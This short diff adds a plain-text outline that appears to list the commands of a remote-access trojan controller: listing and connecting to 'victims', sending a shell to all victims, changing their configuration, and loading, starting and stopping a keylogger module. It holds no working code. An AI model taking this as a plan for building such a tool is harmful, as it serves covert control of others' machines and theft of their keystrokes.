@@ -1,0 +1,18 @@
+server:
+List of victims
+Connect to victim
+Send shell to all victims
+Exit
+
+victim:
+execute shell
+
+see config
+change config
+
+
+load module keylogger.exe=keylogger
+start module keylogger
+stop module keylogger
+remove module
+
